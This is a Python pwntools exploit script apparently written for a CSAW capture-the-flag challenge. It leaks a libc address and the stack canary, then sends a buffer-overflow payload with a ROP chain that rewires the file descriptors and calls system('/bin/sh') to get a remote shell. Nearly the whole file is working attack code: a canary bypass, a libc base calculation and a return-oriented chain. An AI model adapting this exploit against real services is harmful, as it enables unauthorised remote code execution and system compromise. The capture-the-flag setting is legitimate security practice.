#!/usr/bin/env python

from pwn import *

#for switching between local use and remote use

libcname = 'libc-2.19.so' #the libc that was given
#libcname = 'libc-2.23.so'  #my libc for testing


if libcname == 'libc-2.19.so':
    r = remote('pwn.chal.csaw.io', 8002)
    libc = ELF(libcname)
    #get offsets of various symbols in libc-2.19.so
    libc_puts_addr = libc.symbols['puts']
    libc_system_addr = libc.symbols['system']
    libc_bin_sh = next(libc.search('/bin/sh\x00'))
    libc_close = libc.symbols['close']
    libc_fcntl = libc.symbols['fcntl']
    libc_dup = libc.symbols['dup']

else:
    r = remote('127.0.0.1', 8003)
    #pwntools wouldnt handle my libc for some reason, so i just manually got the addresses from ida
    libc_puts_addr = 0x6F5D0
    libc_system_addr = 0x45380
    libc_bin_sh = 0x18C58B
    libc_close = 0xF7030
    libc_fcntl = 0xF6DF0
    libc_dup = 0x0F7090

#use the 'manual' option in the menu
r.sendline('1')

msg = r.recvline()

while 'Reference' not in msg:
    msg = r.recvline()

#get address of puts - 1280
leaked_addr = int(msg[msg.index(':') + 1: msg.index('\n')], 16)
#calculate the base of libc in the process from leaked address
libc_base = leaked_addr + 1280 - libc_puts_addr

#calculate locations of symbols in the process form libc base and offset
real_sys_addr = libc_base + libc_system_addr
real_close_addr = libc_base + libc_close
real_dup_addr = libc_base + libc_dup
bin_sh_addr = libc_base + libc_bin_sh

#address of the pop rdi; ret gadget
pop_rdi_ret = 0x004012e3

#call func2 with no input, to leak the stack canary
finalstr = "2\n"
r.sendline(finalstr)

#print some of the responses for debugging purposes
response = r.recv()
print(response)
response = r.recv()
print(response)
response = r.recv()
print(response)

#get the contents of the stack canary from the output
stack_canary = response[response.index('-Tut') - 12:response.index('-Tut')-4]
print(stack_canary)

#pack the stack canary for use in the exploit
stack_canary = u64(stack_canary)

#incomplete exploit, does not replace stdin and stdout
#finalstr = "2\n" + "A" * (0x140 - 8) + p64(stack_canary) + "AAAAAAAA" + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(real_sys_addr)

#full exploit, as described in README.md
finalstr = "2\n" + "A" * (0x140 - 8) + p64(stack_canary) + "AAAAAAAA" + p64(pop_rdi_ret) + p64(0) + p64(real_close_addr) + p64(pop_rdi_ret) + p64(1) + p64(real_close_addr) + p64(pop_rdi_ret) + p64(4) + p64(real_dup_addr) + p64(real_dup_addr) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(real_sys_addr)
print finalstr

#send the exploit
r.sendline(finalstr)

#switch to interactive shell
r.interactive()

